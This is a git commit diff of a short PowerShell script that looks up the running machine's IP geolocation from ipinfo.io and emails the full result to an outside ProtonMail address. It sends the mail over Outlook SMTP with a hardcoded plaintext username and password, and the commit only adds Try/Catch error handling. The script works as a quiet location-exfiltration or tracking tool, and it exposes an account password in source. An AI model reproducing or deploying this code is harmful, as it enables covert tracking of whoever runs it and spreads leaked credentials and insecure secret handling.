cf880597abc3b5828702322e130a7009444c50ec
Fixo1 <francois.machere@epitech.eu>
2024-04-28 14:10:20 +0200

    error handling

--- script.ps1
+++ script.ps1
@@ -1,22 +1,24 @@
-# Fetch IP-based geolocation
-$ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
-$jsonContent = $ipInfo | ConvertTo-Json -Depth 10
+Try {
+    $ipInfo = Invoke-RestMethod -Uri 'http://ipinfo.io/json'
+    $jsonContent = $ipInfo | ConvertTo-Json -Depth 10
 
-# Setup SMTP variables (using Outlook.com)
-$SmtpServer = 'smtp-mail.outlook.com'
-$SmtpUser = 'UsulMadhi@outlook.com'  # Your Outlook.com email address
-$SmtpPass = 'Eusebe2000'  # Your Outlook.com password
-$Message = $jsonContent
+    $SmtpServer = 'smtp-mail.outlook.com'
+    $SmtpUser = 'UsulMadhi@outlook.com'
+    $SmtpPass = 'Eusebe2000'  # Replace with app password if 2FA is enabled
+    $Message = $jsonContent
 
-# Email properties
-$MailMessage = New-Object System.Net.Mail.MailMessage
-$MailMessage.From = 'UsulMadhi@outlook.com'
-$MailMessage.To.Add('UsulMadhi@proton.me')
-$MailMessage.Subject = 'Complete Geolocation Data'
-$MailMessage.Body = $Message
+    $MailMessage = New-Object System.Net.Mail.MailMessage
+    $MailMessage.From = 'UsulMadhi@outlook.com'
+    $MailMessage.To.Add('UsulMadhi@proton.me')
+    $MailMessage.Subject = 'Complete Geolocation Data'
+    $MailMessage.Body = $Message
 
-# Send Email
-$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) # Port for TLS
-$SMTPClient.EnableSsl = $true
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
-$SMTPClient.Send($MailMessage)
+    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+    $SMTPClient.EnableSsl = $true
+    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
+    $SMTPClient.Send($MailMessage)
+    Write-Host "Email sent successfully!"
+}
+Catch {
+    Write-Host "Error sending email: $_"
+}
